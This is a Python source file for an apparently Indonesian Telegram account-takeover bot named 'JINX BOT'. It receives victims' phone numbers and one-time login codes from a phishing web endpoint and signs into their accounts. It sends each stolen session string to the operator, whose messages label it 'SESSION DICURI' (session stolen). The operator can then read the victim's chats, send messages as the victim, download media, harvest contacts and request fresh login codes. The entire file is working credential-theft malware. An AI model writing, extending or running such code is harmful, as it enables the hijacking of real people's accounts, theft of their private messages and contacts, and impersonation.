from fastapi import FastAPI, Request
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import ChannelParticipantsSearch
import asyncio
import os
import re
import time

app = FastAPI()

# ==== ENV ====
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID'))

client = TelegramClient('jinx', API_ID, API_HASH)
listening = {}
OTP_PATTERN = re.compile(r'\b(\d{5})\b')
sessions = {}  # Simpan client langsung
active_session = None  # Session aktif untuk /login
last_otp_time = {}  # Anti-spam OTP

# === KIRIM FILE SESSION ===
async def send_session(phone, session_str):
    file_path = f"/tmp/{phone.replace('+','')}.session"
    with open(file_path, "w") as f:
        f.write(session_str)
    await client.send_file(ADMIN_ID, file_path, caption=f"SESSION: `{phone}`")
    os.remove(file_path)

# === /start_listener + AUTO KONFIRMASI ===
@app.post("/start_listener")
async def start_listener(req: Request):
    data = await req.json()
    phone = data['phone']
    temp = TelegramClient(StringSession(), API_ID, API_HASH)
    await temp.connect()
    sent = await temp.send_code_request(phone)
    listening[phone] = {'client': temp, 'hash': sent.phone_code_hash}

    # === LISTENER OTP ===
    @temp.on(events.NewMessage(incoming=True, from_users=777000))
    async def otp_handler(e):
        match = OTP_PATTERN.search(e.message.message)
        if match:
            await auto_login(phone, match.group(1), "interceptor")

    # === LISTENER KONFIRMASI "APAKAH ANDA LOGIN DARI..." ===
    @temp.on(events.NewMessage(incoming=True, from_users=777000))
    async def confirm_handler(e):
        text = e.message.message.lower()
        if "apakah anda" in text or "login code" in text or "sign in" in text:
            match = re.search(r'\b(\d{5})\b', e.message.message)
            if match:
                code = match.group(1)
                try:
                    await temp.sign_in(phone, code)
                    me = await temp.get_me()
                    sessions[phone] = temp
                    session_str = temp.session.save()
                    await send_session(phone, session_str)
                    await client.send_message(ADMIN_ID, f"""
KONFIRMASI BERHASIL!
SESSION DIPERBARUI!
User: {me.first_name}
Phone: `{phone}`
/login {phone}
                    """)
                except Exception as err:
                    await client.send_message(ADMIN_ID, f"Gagal konfirmasi: {str(err)}")

    await client.send_message(ADMIN_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
    return {"success": True}

# === /submit_otp ===
@app.post("/submit_otp")
async def submit_otp(req: Request):
    data = await req.json()
    phone = data['phone']
    otp = data['otp']
    if phone in listening:
        await auto_login(phone, otp, "web")
    return {"success": True}

# === AUTO LOGIN ===
async def auto_login(phone, code, source):
    if phone not in listening: return
    temp = listening[phone]['client']
    hash_ = listening[phone]['hash']
    try:
        await temp.sign_in(phone, code, phone_code_hash=hash_)
        me = await temp.get_me()
        sessions[phone] = temp
        session_str = temp.session.save()
        await send_session(phone, session_str)
        await client.send_message(ADMIN_ID, f"""
OTP: `{code}` ({source.upper()})
SESSION DICURI!
User: {me.first_name}
Phone: `{phone}`
/login {phone}
        """)
        del listening[phone]
    except Exception as e:
        await client.send_message(ADMIN_ID, f"Gagal: {str(e)}")

# === /list ===
@client.on(events.NewMessage(pattern=r'/list'))
async def list_cmd(event):
    if event.sender_id != ADMIN_ID: return
    if not sessions:
        await event.reply("Nggak ada session!")
        return
    msg = f"*{len(sessions)} SESSION:*\n"
    for p in sessions:
        msg += f"• `{p}`\n"
    await event.reply(msg, parse_mode='markdown')

# === /login ===
@client.on(events.NewMessage(pattern=r'/login (\+\d+)'))
async def login_cmd(event):
    global active_session
    if event.sender_id != ADMIN_ID: return
    phone = event.pattern_match.group(1)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    stolen = sessions[phone]
    try:
        if not stolen.is_connected():
            await stolen.connect()
        if not await stolen.is_user_authorized():
            await event.reply("Session invalid!")
            return
        me = await stolen.get_me()
        active_session = stolen
        await event.reply(f"""
MASUK AKUN! 
Nama: {me.first_name or 'No Name'}
Phone: `{phone}`

FITUR:
/chats - Lihat semua chat
/send @user pesan - Kirim pesan
/last @user - Pesan terakhir
/dl 123456 - Download file
/contacts - Ambil kontak
/me - Info akun
/logout - Keluar
        """)
    except Exception as e:
        await event.reply(f"Gagal: {str(e)}")

# === /me ===
@client.on(events.NewMessage(pattern=r'/me'))
async def me_cmd(event):
    global active_session
    if event.sender_id != ADMIN_ID or not active_session:
        await event.reply("Login dulu! /login +6285xxx")
        return
    me = await active_session.get_me()
    await event.reply(f"""
INFO AKUN:
Nama: {me.first_name or '-'}
Username: @{me.username or '-'}
Phone: `{me.phone}`
Bio: {getattr(me, 'about', '-') or '-'}
    """)

# === /chats ===
@client.on(events.NewMessage(pattern=r'/chats'))
async def chats_cmd(event):
    global active_session
    if event.sender_id != ADMIN_ID or not active_session:
        await event.reply("Login dulu!")
        return
    msg = "*DAFTAR CHAT:*\n"
    async for d in active_session.iter_dialogs():
        name = d.name
        if hasattr(d.entity, 'username') and d.entity.username:
            name = f"@{d.entity.username}"
        msg += f"• {name}\n"
    await event.reply(msg[:4000], parse_mode='markdown')

# === /last ===
@client.on(events.NewMessage(pattern=r'/last (.+)'))
async def last_cmd(event):
    global active_session
    if event.sender_id != ADMIN_ID or not active_session:
        await event.reply("Login dulu!")
        return
    target = event.pattern_match.group(1)
    try:
        entity = await active_session.get_entity(target)
        async for m in active_session.iter_messages(entity, limit=1):
            text = m.message or "[Media]"
            await event.reply(f"Terakhir:\n{text[:200]}")
    except:
        await event.reply("User tidak ditemukan!")

# === /send ===
@client.on(events.NewMessage(pattern=r'/send (.+) (.+)'))
async def send_cmd(event):
    global active_session
    if event.sender_id != ADMIN_ID or not active_session:
        await event.reply("Login dulu!")
        return
    target = event.pattern_match.group(1)
    text = event.pattern_match.group(2)
    try:
        entity = await active_session.get_entity(target)
        await active_session.send_message(entity, text)
        await event.reply(f"Terkirim ke {target}!")
    except:
        await event.reply("Gagal kirim!")

# === /dl ===
@client.on(events.NewMessage(pattern=r'/dl (\d+)'))
async def dl_cmd(event):
    global active_session
    if event.sender_id != ADMIN_ID or not active_session:
        await event.reply("Login dulu!")
        return
    msg_id = int(event.pattern_match.group(1))
    try:
        msg = await active_session.get_messages(active_session, ids=msg_id)
        if msg[0].media:
            file = await active_session.download_media(msg[0])
            await client.send_file(ADMIN_ID, file, caption=f"From msg {msg_id}")
            os.remove(file)
        else:
            await event.reply("Pesan bukan media!")
    except:
        await event.reply("Gagal download!")

# === /contacts ===
@client.on(events.NewMessage(pattern=r'/contacts'))
async def contacts_cmd(event):
    global active_session
    if event.sender_id != ADMIN_ID or not active_session:
        await event.reply("Login dulu!")
        return
    msg = "*KONTAK:*\n"
    async for user in active_session.iter_participants('me', filter=ChannelParticipantsSearch('')):
        if user.phone:
            msg += f"• `{user.phone}` - {user.first_name}\n"
    await event.reply(msg[:4000], parse_mode='markdown')

# === /logout ===
@client.on(events.NewMessage(pattern=r'/logout'))
async def logout_cmd(event):
    global active_session
    if event.sender_id != ADMIN_ID or not active_session:
        await event.reply("Belum login!")
        return
    await active_session.log_out()
    active_session = None
    await event.reply("Logout berhasil!")

# === /new_otp (ANTI-SPAM 10 MENIT) ===
@client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
async def new_otp(event):
    if event.sender_id != ADMIN_ID: return
    phone = event.pattern_match.group(1)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    
    now = time.time()
    if phone in last_otp_time and now - last_otp_time[phone] < 600:
        wait = int(600 - (now - last_otp_time[phone]))
        await event.reply(f"Tunggu {wait//60} menit lagi!")
        return
    
    stolen = sessions[phone]
    try:
        if not stolen.is_connected():
            await stolen.connect()
        if not await stolen.is_user_authorized():
            await event.reply("Session invalid!")
            return
        
        sent = await stolen.send_code_request(phone)
        last_otp_time[phone] = time.time()
        msg = await event.reply(f"OTP BARU DIKIRIM KE `{phone}`\nMenunggu kode...")
        
        @stolen.on(events.NewMessage(incoming=True, from_users=777000))
        async def otp_handler(e):
            match = OTP_PATTERN.search(e.message.message)
            if match:
                new_code = match.group(1)
                await client.edit_message(ADMIN_ID, msg.id, f"OTP BARU: `{new_code}`")
                stolen.remove_event_handler(otp_handler)
                
    except Exception as e:
        await event.reply(f"Gagal: {str(e)}")

# === /help ===
@client.on(events.NewMessage(pattern=r'/help'))
async def help_cmd(event):
    if event.sender_id != ADMIN_ID: return
    await event.reply("""
JINX BOT
/list → Lihat session
/login +6281xxx → Masuk akun
/new_otp +6281xxx → Spam OTP (tunggu 10 menit)
/chats → Lihat chat
/send @user pesan → Kirim
/dl 123456 → Download
/contacts → Ambil kontak
/me → Info akun
/logout → Keluar
    """)

# === STARTUP ===
@app.on_event("startup")
async def startup():
    await client.start(bot_token=BOT_TOKEN)
    print("JINX BOT JALAN – SEMUA FITUR /login 100% JALAN!")
